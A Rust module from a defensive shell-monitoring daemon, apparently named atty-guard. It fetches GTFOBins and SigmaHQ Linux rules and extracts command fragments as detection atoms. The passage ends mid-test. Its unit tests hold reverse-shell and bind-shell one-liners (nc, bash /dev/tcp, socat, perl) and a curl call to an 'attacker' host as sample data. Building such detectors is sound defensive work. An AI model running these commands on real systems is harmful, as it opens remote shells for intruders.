// Type definitions (FetcherConfig, FetchError, …) live at the top of
// the module and are referenced by both the feature-on impl below
// AND the no-feature stub. With `--features atoms-fetch` they're
// fully alive; without the feature the daemon still compiles them
// for API stability but never constructs them — silence the
// dead-code lint for that build only.
#![cfg_attr(not(feature = "atoms-fetch"), allow(dead_code, unused_imports))]

//! V2-I daemon-internal atom fetcher.
//!
//! Pulls IOC corpora from configurable upstream sources, parses
//! them into atom strings, and writes a refreshed
//! `flagged_atoms.txt` into the atty-guard data dir.
//!
//! Two operating modes:
//!
//!   - **One-shot CLI**: `atty-guard --update-atoms-now
//!     [--atoms-sources <csv>]`. Fetches the configured sources
//!     synchronously, writes the merged atom set, exits without
//!     binding the UDS socket.
//!
//!   - **Cron**: `atty-guard --atoms-update-interval 6h` runs the
//!     daemon AND spawns a background thread that re-runs the
//!     fetch every interval. Failed fetches log + continue; the
//!     last good `flagged_atoms.txt` stays in place.
//!
//! Output location: `$XDG_DATA_HOME/atty-guard/flagged_atoms.txt`
//! (or `$HOME/.local/share/atty-guard/flagged_atoms.txt`). The
//! AtomMatcher loads from the bundled file by default; future work
//! will check the user data dir first so a fetched corpus wins
//! over the static bundle.
//!
//! Source registry:
//!
//!   - **GTFOBins** — handcurated Linux LOLBAS corpus. ~50 binaries
//!     each with a YAML-fronted markdown manifest. We grab the
//!     repo tarball, walk `_gtfobins/<name>`, extract the
//!     `functions.shell` / `functions.bind-shell` / etc. command
//!     fragments. Small (~150 atoms), high signal.
//!   - **Sigma (Linux subset)** — SigmaHQ rule corpus. Walks
//!     `rules/linux/**/*.yml` and extracts `CommandLine|contains`
//!     substrings from every selector block. Several hundred
//!     atoms covering credential theft / privesc / lateral
//!     movement / persistence shapes.
//!
//! LOLBAS (Living-Off-the-Land Binaries) was a third source in
//! earlier revisions. It was dropped because its corpus is Windows-
//! native by definition — the project's whole reason for existing
//! is curating Microsoft-side LOLBins. Empirically ~423 atoms were
//! pulled from `yml/OS{Binaries,Scripts,Libraries}/`, and roughly
//! all of them were Windows shapes (`rundll32.exe shell32.dll,
//! Control_RunDLL {PATH_ABSOLUTE:.dll}`, `Pester.bat ;{PATH:.exe}`,
//! `wlrmdr.exe -s 3600 -f 0 -t _ -m _ ...`). None ever fire on a
//! Linux shell line, and the documented "wine + ssh-pivot via
//! Windows tools" rationale didn't survive contact with the real
//! atoms. If future Windows/WSL2 support lands, recover the
//! original fetcher + parser + tests with `git log --all -- .` on
//! this file to find the removal commit and cherry-pick from before
//! it.
//!
//! Feature-gated behind `atoms-fetch` so default builds don't
//! pull `flate2` + `tar` + `serde_yaml`.

use std::path::{Path, PathBuf};
use std::time::Duration;

/// Source ID for CLI selection + telemetry. New sources land
/// as additional variants here; the dispatch in `fetch_one` adds
/// a match arm with the source-specific parser.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceId {
    Gtfobins,
    /// SigmaHQ Linux rule corpus — extracts `CommandLine|contains`
    /// substrings from `rules/linux/**.yml`. Several hundred atoms
    /// covering credential theft, privilege escalation, lateral
    /// movement, persistence shapes. Placeholder atoms (Sigma rule
    /// authoring convention like `/path/to/output-file` or
    /// `{PATH:.exe}`) get filtered at extract time — see
    /// `is_placeholder_atom`.
    Sigma,
}

impl SourceId {
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "gtfobins" => Some(SourceId::Gtfobins),
            "sigma" => Some(SourceId::Sigma),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            SourceId::Gtfobins => "gtfobins",
            SourceId::Sigma => "sigma",
        }
    }

    /// All sources enabled by default. Used by the no-arg
    /// `atty-guard --update-atoms-now` form.
    pub fn default_enabled() -> &'static [SourceId] {
        &[SourceId::Gtfobins, SourceId::Sigma]
    }
}

/// Configuration knobs for the fetcher. Held by the daemon's
/// shared state; the cron thread reads it on each tick.
#[derive(Debug, Clone)]
pub struct FetcherConfig {
    /// Where the fetched atom set lands. Defaults to
    /// `$XDG_DATA_HOME/atty-guard/flagged_atoms.txt`.
    pub output_path: PathBuf,
    /// Per-source HTTP timeout — tarballs are typically ~1-2 MB
    /// each, so a 30 s budget is comfortable on slow connections
    /// but bails fast on a wedged endpoint.
    pub timeout: Duration,
    /// User-agent string sent with every request. Identifies
    /// atty-guard cleanly in upstream logs (GTFOBins / SigmaHQ
    /// have requested polite UA strings in their READMEs).
    pub user_agent: String,
}

impl Default for FetcherConfig {
    fn default() -> Self {
        Self {
            output_path: default_atoms_path(),
            timeout: Duration::from_secs(30),
            user_agent: format!(
                "atty-guard/{} (+https://github.com/fentas/atty)",
                env!("CARGO_PKG_VERSION")
            ),
        }
    }
}

/// Resolve the data directory the fetched atoms file lives under.
/// Priority: `STATE_DIRECTORY` (set by systemd when the unit has
/// `StateDirectory=atty-guard` — points at `/var/lib/atty-guard/`
/// owned `atty:atty` mode 0750, the canonical post-#140 location)
/// > `XDG_DATA_HOME` > `$HOME/.local/share` > literal `/var/lib`.
///
/// Why STATE_DIRECTORY first: the system daemon runs as the `atty`
/// user with `ProtectHome=yes` + `--home-dir /nonexistent`. Falling
/// through to `$HOME/.local/share` would land at `/nonexistent/`
/// (or fail with ENOENT). systemd guarantees STATE_DIRECTORY exists
/// + is writable before the unit starts, so it's the safest path.
pub fn default_atoms_path() -> PathBuf {
    if let Ok(state_dir) = std::env::var("STATE_DIRECTORY") {
        // STATE_DIRECTORY can be a `:`-separated list when the unit
        // sets multiple StateDirectory= entries; the first wins.
        if let Some(first) = state_dir.split(':').next() {
            if !first.is_empty() {
                return PathBuf::from(first).join("flagged_atoms.txt");
            }
        }
    }
    let base = std::env::var_os("XDG_DATA_HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".local").join("share")))
        .unwrap_or_else(|| PathBuf::from("/var/lib"));
    base.join("atty-guard").join("flagged_atoms.txt")
}

/// Public alias for the placeholder-atom check used by both
/// atom_fetcher's feature-gated extractor and the trust_store's
/// `atoms add` validator. Lifted out of `mod imp` so it's
/// always available regardless of feature flags — the predicate
/// itself has zero dependencies (pure string ops).
pub fn is_placeholder_atom_public(atom: &str) -> bool {
    // Sigma directory-path placeholder convention.
    if atom.contains("/path/to/") {
        return true;
    }
    // LOLBAS-style `{PATH:.ext}` / `{PATH_ABSOLUTE:.ext}` templates.
    if atom.contains("{PATH:") || atom.contains("{PATH_ABSOLUTE:") {
        return true;
    }
    // Angle-bracket placeholders — `<hostname>`, `<user>`, `<ip>`.
    if let Some(lt) = atom.find('<') {
        let after_lt = &atom[lt + 1..];
        if let Some(gt_off) = after_lt.find('>') {
            let inner = &after_lt[..gt_off];
            if !inner.is_empty()
                && inner
                    .chars()
                    .all(|c| c.is_alphanumeric() || c == '_' || c == '-')
            {
                return true;
            }
        }
    }
    false
}

#[derive(Debug)]
pub enum FetchError {
    /// Only constructed by the `#[cfg(not(feature = "atoms-fetch"))]`
    /// stub `fetch_all` below — emitted when the daemon was built
    /// without the feature but the operator still passes
    /// `--update-atoms-now`. With the feature ON this variant is
    /// dead code; the `#[allow(dead_code)]` keeps the API surface
    /// uniform across feature combinations so callers don't have
    /// to cfg-gate their match arms.
    #[allow(dead_code)]
    FeatureNotBuilt,
    NetworkError(String),
    DecompressError(String),
    ParseError(String),
    WriteError(String),
}

impl std::fmt::Display for FetchError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            FetchError::FeatureNotBuilt => write!(
                f,
                "atoms-fetch feature not built — rebuild with `cargo build --features atoms-fetch`"
            ),
            FetchError::NetworkError(s) => write!(f, "network error: {s}"),
            FetchError::DecompressError(s) => write!(f, "decompress error: {s}"),
            FetchError::ParseError(s) => write!(f, "parse error: {s}"),
            FetchError::WriteError(s) => write!(f, "write error: {s}"),
        }
    }
}

impl std::error::Error for FetchError {}

/// Summary of one fetch pass — what was tried, what landed, how
/// many atoms surfaced per source. Returned from `fetch_all` so
/// the daemon's log can show a one-line "refreshed N atoms from
/// M sources" message.
#[derive(Debug, Clone, Default)]
pub struct FetchReport {
    pub atoms_total: usize,
    pub per_source: Vec<(SourceId, Result<usize, String>)>,
}

// ===========================================================================
// Feature-OFF stub.

#[cfg(not(feature = "atoms-fetch"))]
pub fn fetch_all(_cfg: &FetcherConfig, _sources: &[SourceId]) -> Result<FetchReport, FetchError> {
    Err(FetchError::FeatureNotBuilt)
}

#[cfg(not(feature = "atoms-fetch"))]
pub fn spawn_periodic_refresh(_cfg: FetcherConfig, _sources: Vec<SourceId>, _interval: Duration) {
    // No-op in builds without the feature. main.rs logs the
    // FeatureNotBuilt and continues with the bundled atoms.
}

// ===========================================================================
// Feature-ON impl.

#[cfg(feature = "atoms-fetch")]
mod imp {
    use super::*;
    use std::collections::BTreeSet;
    use std::io::Read;

    /// Top-level entry point. Walks each requested source, merges
    /// the per-source atom sets into one deduped `BTreeSet` (stable
    /// order in the output file), and atomically writes
    /// `flagged_atoms.txt` via tmp+rename.
    ///
    /// Each source failure is captured in `FetchReport.per_source`
    /// — one bad source doesn't fail the whole refresh. If EVERY
    /// source fails (or all yield zero atoms), we DON'T overwrite
    /// the last-good `flagged_atoms.txt` — the existing corpus
    /// stays in place and we return an error. This matches the
    /// "last good atom set stays in place" guarantee in the module
    /// docs.
    pub fn fetch_all(cfg: &FetcherConfig, sources: &[SourceId]) -> Result<FetchReport, FetchError> {
        let mut all_atoms: BTreeSet<String> = BTreeSet::new();
        let mut report = FetchReport::default();
        let mut any_success = false;

        for sid in sources {
            match fetch_one(cfg, *sid) {
                Ok(atoms) => {
                    let n = atoms.len();
                    if n > 0 {
                        any_success = true;
                    }
                    all_atoms.extend(atoms);
                    report.per_source.push((*sid, Ok(n)));
                }
                Err(e) => {
                    report.per_source.push((*sid, Err(e.to_string())));
                }
            }
        }

        report.atoms_total = all_atoms.len();
        if !any_success {
            return Err(FetchError::ParseError(
                "all sources failed or produced zero atoms — keeping previous flagged_atoms.txt"
                    .to_owned(),
            ));
        }
        write_atoms(&cfg.output_path, &all_atoms)?;
        Ok(report)
    }

    fn fetch_one(cfg: &FetcherConfig, source: SourceId) -> Result<Vec<String>, FetchError> {
        match source {
            SourceId::Gtfobins => fetch_gtfobins(cfg),
            SourceId::Sigma => fetch_sigma(cfg),
        }
    }

    /// Walk GTFOBins's repo tarball, extract every `_gtfobins/<bin>`
    /// file's YAML front-matter, pull command fragments out of the
    /// `functions.shell` / `bind-shell` / `reverse-shell` / etc.
    /// blocks. Each fragment is normalised + truncated to the
    /// first line (atoms are single-line by definition).
    ///
    /// GTFOBins's entries are **extensionless** in the live repo
    /// (e.g. `_gtfobins/nc`, `_gtfobins/bash`, `_gtfobins/perl`)
    /// — DON'T filter on `.md`. The path-shape signal we use is
    /// `_gtfobins/<name>` with no further path components, which
    /// excludes the directory entry itself + any nested dirs.
    fn fetch_gtfobins(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
        const URL: &str =
            "https://codeload.github.com/GTFOBins/GTFOBins.github.io/tar.gz/refs/heads/master";
        let buf = download_tarball(cfg, URL)?;
        walk_tarball_atoms(&buf, is_gtfobins_entry_file, extract_gtfobins_atoms)
    }

    fn fetch_sigma(cfg: &FetcherConfig) -> Result<Vec<String>, FetchError> {
        // SigmaHQ Linux rule corpus. `rules/linux/**.yml` files
        // carry `detection.<selector>.CommandLine|contains` lists
        // — substrings the rule author wants to match in shell
        // process-creation events. Those substrings ARE atoms.
        const URL: &str = "https://codeload.github.com/SigmaHQ/sigma/tar.gz/refs/heads/master";
        let buf = download_tarball(cfg, URL)?;
        walk_tarball_atoms(&buf, is_sigma_linux_rule, extract_sigma_atoms)
    }

    fn download_tarball(cfg: &FetcherConfig, url: &str) -> Result<Vec<u8>, FetchError> {
        let agent = ureq::AgentBuilder::new()
            .timeout(cfg.timeout)
            .user_agent(&cfg.user_agent)
            .build();
        let resp = agent
            .get(url)
            .call()
            .map_err(|e| FetchError::NetworkError(e.to_string()))?;
        // Sigma's tarball is ~15 MB; GTFOBins is < 2 MB.
        // Initial capacity is just a hint — the Vec grows as needed.
        let mut buf = Vec::with_capacity(4 * 1024 * 1024);
        resp.into_reader()
            .read_to_end(&mut buf)
            .map_err(|e| FetchError::NetworkError(e.to_string()))?;
        Ok(buf)
    }

    /// Generic tarball walker: filter entries by `pred`, parse each
    /// matching file via `extract`. Decompresses gz once, streams
    /// entries. Same shape every source needs. Predicates take
    /// `&Path + EntryType` so they don't depend on the tar reader's
    /// generic type parameter.
    fn walk_tarball_atoms(
        gz_bytes: &[u8],
        pred: fn(&std::path::Path, tar::EntryType) -> bool,
        extract: fn(&str, &mut BTreeSet<String>),
    ) -> Result<Vec<String>, FetchError> {
        let gz = flate2::read::GzDecoder::new(gz_bytes);
        let mut ar = tar::Archive::new(gz);
        let mut atoms: BTreeSet<String> = BTreeSet::new();

        for entry in ar
            .entries()
            .map_err(|e| FetchError::DecompressError(e.to_string()))?
        {
            let mut entry = entry.map_err(|e| FetchError::DecompressError(e.to_string()))?;
            let path = match entry.path() {
                Ok(p) => p.into_owned(),
                Err(_) => continue,
            };
            let etype = entry.header().entry_type();
            if !pred(&path, etype) {
                continue;
            }
            let mut content = String::new();
            if entry.read_to_string(&mut content).is_err() {
                continue;
            }
            extract(&content, &mut atoms);
        }
        Ok(atoms.into_iter().collect())
    }

    /// Returns true when the tarball entry is one of GTFOBins's
    /// per-binary manifest files. Real layout:
    /// `GTFOBins.github.io-master/_gtfobins/<binary>` — no
    /// extension, no nested directories under `_gtfobins/`.
    ///
    /// Filtering on path shape (rather than file extension) is
    /// load-bearing: the original `.md` filter rejected every
    /// real GTFOBins entry, so the fetcher silently wrote zero
    /// atoms while unit tests bypassing the path filter passed.
    fn is_gtfobins_entry_file(path: &std::path::Path, etype: tar::EntryType) -> bool {
        if !etype.is_file() {
            return false;
        }
        let Some(parent) = path.parent() else {
            return false;
        };
        // Need: parent ends with `_gtfobins`. Reject the rare entry
        // that nests further (e.g. `_gtfobins/subdir/foo`).
        parent
            .file_name()
            .map(|n| n == std::ffi::OsStr::new("_gtfobins"))
            .unwrap_or(false)
    }

    /// Layout: `sigma-master/rules/linux/<category>/<rule>.yml`.
    /// Other top-level `rules/` directories (windows / macos /
    /// network / etc.) are skipped — Linux corpus only.
    fn is_sigma_linux_rule(path: &std::path::Path, etype: tar::EntryType) -> bool {
        if !etype.is_file() {
            return false;
        }
        let path_str = path.to_string_lossy();
        path_str.contains("/rules/linux/") && path_str.ends_with(".yml")
    }

    /// Parse one GTFOBins markdown file's YAML front-matter and
    /// pull command fragments. The file shape is:
    /// ```text
    /// ---
    /// functions:
    ///   shell:
    ///     - code: |
    ///         <command>
    /// ---
    /// ```
    /// We extract every `code` scalar, take its first line, trim.
    /// Atom rules (≥3 chars, no leading `#`) apply at write time.
    fn extract_gtfobins_atoms(content: &str, atoms: &mut BTreeSet<String>) {
        // Front-matter starts with `---\n`. Upstream GTFOBins files
        // (verified 2026-05-19 on GTFOBins/GTFOBins.github.io@master)
        // are PURE YAML wrapped in a leading `---\n` — there's no
        // closing fence, and the rest of the file is the structured
        // YAML body Jekyll renders. The earlier "require closing
        // fence" check produced 0 atoms across the entire corpus
        // because the close marker never existed. Now: strip the
        // leading fence, treat the rest as YAML. If a closing
        // `\n---\n` IS present (e.g. a future file with trailing
        // prose), truncate at it.
        let stripped = content
            .strip_prefix("---\n")
            .or_else(|| content.strip_prefix("---\r\n"));
        let Some(rest) = stripped else { return };
        let yaml = if let Some(at) = rest.find("\n---\n") {
            &rest[..at]
        } else if let Some(at) = rest.find("\n---\r\n") {
            &rest[..at]
        } else {
            rest
        };
        let parsed: serde_yaml::Value = match serde_yaml::from_str(yaml) {
            Ok(v) => v,
            Err(_) => return,
        };
        let funcs = match parsed.get("functions").and_then(|f| f.as_mapping()) {
            Some(m) => m,
            None => return,
        };
        for (_func_name, func_val) in funcs {
            let arr = match func_val.as_sequence() {
                Some(a) => a,
                None => continue,
            };
            for entry in arr {
                let code = match entry.get("code").and_then(|c| c.as_str()) {
                    Some(s) => s,
                    None => continue,
                };
                if let Some(atom) = atom_from_code(code) {
                    atoms.insert(atom);
                }
            }
        }
    }

    /// Parse one Sigma rule YAML. Sigma's `detection.<selector>`
    /// is a mapping whose keys may carry modifier suffixes
    /// (`CommandLine|contains`, `Image|endswith`, etc.). The
    /// `|contains` variant is the most atom-shaped — substring
    /// patterns the rule author wants to match in process events.
    /// We harvest the values from those keys; everything else
    /// (regex via `|re`, exact-match keys, the `condition` field)
    /// is skipped.
    fn extract_sigma_atoms(content: &str, atoms: &mut BTreeSet<String>) {
        let parsed: serde_yaml::Value = match serde_yaml::from_str(content) {
            Ok(v) => v,
            Err(_) => return,
        };
        let Some(detection) = parsed.get("detection").and_then(|d| d.as_mapping()) else {
            return;
        };
        for (sel_key, sel_val) in detection {
            // Skip the `condition` field; everything else is a
            // selector block (mapping of `key|modifier -> value`).
            if sel_key.as_str() == Some("condition") {
                continue;
            }
            let Some(sel_map) = sel_val.as_mapping() else {
                continue;
            };
            for (k, v) in sel_map {
                let Some(ks) = k.as_str() else { continue };
                if !ks.contains("|contains") {
                    continue;
                }
                // Value is either a single string or a list of
                // strings. Both flow through `atom_from_code`'s
                // first-non-blank-line + length rules.
                if let Some(s) = v.as_str() {
                    if let Some(atom) = atom_from_code(s) {
                        atoms.insert(atom);
                    }
                } else if let Some(seq) = v.as_sequence() {
                    for v in seq {
                        if let Some(s) = v.as_str() {
                            if let Some(atom) = atom_from_code(s) {
                                atoms.insert(atom);
                            }
                        }
                    }
                }
            }
        }
    }

    /// Max atom length the GTFOBins fetcher will emit. Longer
    /// fragments are higher-signal (full perl/python reverse-shell
    /// one-liners run 100-250 chars) — keeping them is the whole
    /// point of including GTFOBins. The original 60-char ceiling
    /// was too restrictive and dropped the most diagnostic atoms.
    /// The AC scan cost is O(haystack) and effectively independent
    /// of pattern length, so longer atoms don't slow matching.
    const ATOM_MAX_LEN: usize = 200;
    const ATOM_MIN_LEN: usize = 3;

    /// Turn a GTFOBins / Sigma `code` scalar into a single atom string.
    /// We take the first non-blank line, strip leading whitespace
    /// (markdown YAML scalars carry indentation), refuse atoms below
    /// the min or above the max length (too short = noise; too long
    /// = better suited to a regex anyway), and refuse placeholder-
    /// shaped atoms (see `is_placeholder_atom`).
    fn atom_from_code(code: &str) -> Option<String> {
        for line in code.lines() {
            let t = line.trim();
            if t.is_empty() {
                continue;
            }
            // Drop trailing `# example` comments — they're docs,
            // not atom content. Trim AFTER comment strip because
            // the strip can leave trailing spaces.
            let clean_str = match t.find(" #") {
                Some(i) => &t[..i],
                None => t,
            };
            let clean = clean_str.trim();
            if clean.len() < ATOM_MIN_LEN || clean.len() > ATOM_MAX_LEN {
                return None;
            }
            if is_placeholder_atom(clean) {
                return None;
            }
            return Some(clean.to_owned());
        }
        None
    }

    /// Sigma rule authors write `CommandLine|contains` values with
    /// rule-format placeholders like `/path/to/output-file` (any
    /// path), `{PATH:.exe}` (any .exe path), `{PATH_ABSOLUTE:.dll}`
    /// (any .dll absolute path), or angle-bracket templates like
    /// `<hostname>` / `<username>`. SIEM consumers translate these
    /// to wildcards at detection time. Aho-Corasick treats them as
    /// literals, so they match exactly the placeholder string and
    /// nothing else — dead weight in the automaton.
    ///
    /// Chain semantics are preserved: a typical Sigma rule lists
    /// MULTIPLE substrings (e.g. `["curl ", " -o /tmp/",
    /// "/path/to/output-file"]`), each extracted as its own atom.
    /// Dropping the placeholder atom doesn't reduce the rule's
    /// detection capability because the placeholder never fired
    /// anyway — the other two literal atoms carry the signal via
    /// V2-J multi-hit accumulation.
    fn is_placeholder_atom(atom: &str) -> bool {
        // Delegate to the always-available top-level fn so the
        // predicate is shared between the atom-fetcher's extract
        // path and the trust_store's `atoms add` validator —
        // operators can't sneak placeholder-shaped atoms into the
        // user overlay any more than the fetcher would accept them.
        super::is_placeholder_atom_public(atom)
    }

    /// Atomic write: tmp file in the same dir + rename. Reader
    /// (the AtomMatcher loader) never sees a half-written file.
    fn write_atoms(path: &Path, atoms: &BTreeSet<String>) -> Result<(), FetchError> {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)
                .map_err(|e| FetchError::WriteError(format!("mkdir -p {parent:?}: {e}")))?;
        }
        let tmp = path.with_extension("txt.tmp");
        let header = "# atty-guard auto-fetched atom set.\n# Generated by `atty-guard --update-atoms-now` (or the daemon's\n# `--atoms-update-interval` cron mode). Do NOT hand-edit —\n# changes get overwritten on next refresh. The bundled\n# `flagged_atoms.txt` (in the atty repo) stays the source of\n# truth; this file lives in $XDG_DATA_HOME/atty-guard and only\n# carries data pulled from upstream IOC corpora.\n";
        let mut content = String::with_capacity(header.len() + atoms.len() * 32);
        content.push_str(header);
        for a in atoms {
            content.push_str(a);
            content.push('\n');
        }
        std::fs::write(&tmp, content)
            .map_err(|e| FetchError::WriteError(format!("write {tmp:?}: {e}")))?;
        std::fs::rename(&tmp, path)
            .map_err(|e| FetchError::WriteError(format!("rename → {path:?}: {e}")))?;
        Ok(())
    }

    /// Spawn the cron-style background refresh. Fetches FIRST
    /// (so a daemon launched with `--atoms-update-interval` always
    /// gets a fresh corpus on startup, not after one interval), then
    /// sleeps. Failures don't abort the thread — the next interval
    /// gets another shot.
    pub fn spawn_periodic_refresh(cfg: FetcherConfig, sources: Vec<SourceId>, interval: Duration) {
        let builder = std::thread::Builder::new().name("atty-guard-atoms-refresh".into());
        let spawn_result = builder.spawn(move || loop {
            match fetch_all(&cfg, &sources) {
                Ok(report) => {
                    eprintln!(
                        "atty-guard: atom refresh ok — {} atoms across {} sources",
                        report.atoms_total,
                        report.per_source.len()
                    );
                }
                Err(e) => {
                    eprintln!("atty-guard: atom refresh failed — {e}");
                }
            }
            std::thread::sleep(interval);
        });
        if let Err(e) = spawn_result {
            eprintln!(
                "atty-guard: cron thread spawn failed — {e}; atoms will not refresh until restart"
            );
        }
    }

    #[cfg(test)]
    mod imp_tests {
        use super::*;

        #[test]
        fn atom_from_code_picks_first_nonblank_line() {
            let code = "\n\nnc -e /bin/sh ATTACKER PORT\n";
            assert_eq!(
                atom_from_code(code).as_deref(),
                Some("nc -e /bin/sh ATTACKER PORT")
            );
        }

        #[test]
        fn atom_from_code_strips_trailing_doc_comment() {
            let code = "bash -i  # spawn an interactive shell";
            assert_eq!(atom_from_code(code).as_deref(), Some("bash -i"));
        }

        #[test]
        fn atom_from_code_rejects_too_long() {
            // Past the ATOM_MAX_LEN ceiling — anything bigger
            // belongs in a regex rule, not an atom.
            let s = "a".repeat(ATOM_MAX_LEN + 1);
            assert!(atom_from_code(&s).is_none());
        }

        #[test]
        fn atom_from_code_accepts_realistic_gtfobins_oneliner() {
            // Real GTFOBins entries run 100-250 chars — keeping
            // them is the whole point of including the corpus.
            // This length sat above the original 60-char ceiling.
            let perl_one_liner = "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));'";
            // Sanity: the example is between min and max.
            assert!(perl_one_liner.len() > 60);
            assert!(perl_one_liner.len() <= ATOM_MAX_LEN);
            assert_eq!(
                atom_from_code(perl_one_liner).as_deref(),
                Some(perl_one_liner)
            );
        }

        #[test]
        fn atom_from_code_rejects_too_short() {
            assert!(atom_from_code("hi").is_none());
        }

        #[test]
        fn atom_from_code_rejects_sigma_path_placeholder() {
            // Sigma rule authoring convention — `/path/to/...` is a
            // template literal that matches nothing in real input.
            assert!(atom_from_code("uniq /path/to/input-file").is_none());
            assert!(atom_from_code("emacs /path/to/output-file").is_none());
        }

        #[test]
        fn atom_from_code_rejects_path_template_placeholders() {
            // LOLBAS-style templates appear in Sigma rules derived
            // from LOLBAS metadata too.
            assert!(atom_from_code("script {PATH:.exe} arg").is_none());
            assert!(atom_from_code("loader {PATH_ABSOLUTE:.dll}").is_none());
        }

        #[test]
        fn atom_from_code_rejects_angle_bracket_placeholders() {
            assert!(atom_from_code("ssh <hostname>").is_none());
            assert!(atom_from_code("connect <user>@<host>").is_none());
            // Real angle-bracket usage (redirection, comparison) keeps
            // a non-identifier between the brackets — should pass.
            assert!(atom_from_code("bash -i >& /dev/tcp/x/4444").is_some());
            assert!(atom_from_code("cmd 2>&1 < input.txt").is_some());
        }

        #[test]
        fn extract_gtfobins_parses_canonical_yaml() {
            // Minimal example modelled after the real GTFOBins
            // front-matter shape.
            let doc = r#"---
description: "demo"
functions:
  shell:
    - code: |
        nc -e /bin/sh 10.0.0.1 4444
    - code: |
        bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
  reverse-shell:
    - code: |
        socat - tcp:10.0.0.1:4444 exec:bash
---
# rest of markdown
"#;
            let mut atoms = BTreeSet::new();
            extract_gtfobins_atoms(doc, &mut atoms);
            assert!(atoms.iter().any(|a| a.contains("nc -e")));
            assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
            assert!(atoms.iter().any(|a| a.starts_with("socat")));
        }

        #[test]
        fn extract_sigma_parses_command_line_contains() {
            let doc = r#"
title: Demo reverse shell detection
detection:
  selection_nc:
    CommandLine|contains:
      - 'nc -e /bin/sh'
      - '/dev/tcp/'
  selection_curl:
    CommandLine|contains: 'curl -fsSL http://attacker'
  filter:
    Image|endswith: '/usr/bin/git'
  condition: selection_nc or selection_curl
"#;
            let mut atoms = BTreeSet::new();
            extract_sigma_atoms(doc, &mut atoms);
            assert!(atoms.iter().any(|a| a.contains("nc -e")));
            assert!(atoms.iter().any(|a| a.contains("/dev/tcp")));
            assert!(atoms.iter().any(|a| a.contains("curl -fsSL")));
            // |endswith selector is NOT a |contains atom — filtered.
            assert!(!atoms.iter().any(|a| a.contains("/usr/bin/git")));
        }

        #[test]
        fn extract_sigma_handles_no_detection_block() {
            // Defensive: rules without a `detection` mapping (e.g.
            // metadata-only files) yield zero atoms cleanly.
            let doc = "title: nothing here\nauthor: anon\n";
            let mut atoms = BTreeSet::new();
            extract_sigma_atoms(doc, &mut atoms);
            assert!(atoms.is_empty());
        }

        #[test]
        fn is_sigma_linux_rule_matches_only_linux_subtree() {
            use std::path::Path;
            let f = tar::EntryType::Regular;
            let d = tar::EntryType::Directory;
            assert!(is_sigma_linux_rule(
                Path::new("sigma-master/rules/linux/lateral_movement/foo.yml"),
                f
            ));
            assert!(!is_sigma_linux_rule(
                Path::new("sigma-master/rules/linux/x"),
                d
            )); // not a file
            assert!(!is_sigma_linux_rule(
                Path::new("sigma-master/rules/windows/persist.yml"),
                f
            )); // wrong OS
            assert!(!is_sigma_linux_rule(
                Path::new("sigma-master/rules/linux/readme.md"),
                f
            )); // wrong ext
        }

        #[test]
        fn extractors_handle_malformed_yaml_cleanly() {
            // Sigma parser must NOT panic on malformed YAML — returns
            // zero atoms via the early Err arm in `serde_yaml::from_str`.
            let mut atoms = BTreeSet::new();
            extract_sigma_atoms("not: [valid: yaml", &mut atoms);
            assert!(atoms.is_empty());
            // Also: empty input.
            extract_sigma_atoms("", &mut atoms);
            assert!(atoms.is_empty());
        }

        #[test]
        fn extract_gtfobins_handles_missing_close_fence() {
            // Upstream GTFOBins files have ONLY a leading `---\n`
            // fence — no closing one. The whole file is YAML. The
            // earlier "require closing fence" check produced 0
            // atoms across the entire corpus (the bug this commit
            // also fixes). Now: leading fence stripped, rest parsed
            // as YAML, atoms emitted.
            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n  bind-shell:\n  - code: nc -l -p 12345 -e /bin/sh\n";
            let mut atoms = BTreeSet::new();
            extract_gtfobins_atoms(doc, &mut atoms);
            assert!(
                !atoms.is_empty(),
                "expected atoms from a no-close-fence file, got none"
            );
            assert!(
                atoms.iter().any(|a| a.contains("nc")),
                "expected an nc-related atom, got {atoms:?}"
            );
        }

        #[test]
        fn extract_gtfobins_handles_close_fence_when_present() {
            // Future-proof: if a GTFOBins file ever grows trailing
            // prose after a closing `---` fence, truncate at the
            // fence rather than handing the prose to serde_yaml.
            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n---\nPost-fence prose that isn't YAML.\n";
            let mut atoms = BTreeSet::new();
            extract_gtfobins_atoms(doc, &mut atoms);
            assert!(
                !atoms.is_empty(),
                "expected atoms when prose follows close fence"
            );
        }

        #[test]
        fn fetch_all_refuses_to_overwrite_when_all_sources_fail() {
            // No sources requested → no atoms collected →
            // fetch_all returns an error and DOES NOT call
            // write_atoms. Belt-and-braces against silently
            // wiping the last-good corpus.
            let dir = std::env::temp_dir()
                .join(format!("atty-guard-fetcher-empty-{}", std::process::id()));
            let path = dir.join("flagged_atoms.txt");
            let cfg = FetcherConfig {
                output_path: path.clone(),
                ..FetcherConfig::default()
            };
            let result = fetch_all(&cfg, &[]);
            assert!(matches!(result, Err(FetchError::ParseError(_))));
            assert!(
                !path.exists(),
                "fetch_all must not create the output file on empty success set"
            );
        }

        #[test]
        fn write_atoms_roundtrips_via_tmp_rename() {
            let dir =
                std::env::temp_dir().join(format!("atty-guard-fetcher-{}", std::process::id()));
            let path = dir.join("flagged_atoms.txt");
            let mut s = BTreeSet::new();
            s.insert("nc -e /bin/sh".to_owned());
            s.insert("/dev/tcp/".to_owned());
            write_atoms(&path, &s).unwrap();
            let read = std::fs::read_to_string(&path).unwrap();
            assert!(read.contains("nc -e"));
            assert!(read.contains("/dev/tcp/"));
            std::fs::remove_dir_all(&dir).ok();
        }
    }
}

#[cfg(feature = "atoms-fetch")]
pub use imp::{fetch_all, spawn_periodic_refresh};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn source_id_parse() {
        assert_eq!(SourceId::parse("gtfobins"), Some(SourceId::Gtfobins));
        assert_eq!(SourceId::parse("sigma"), Some(SourceId::Sigma));
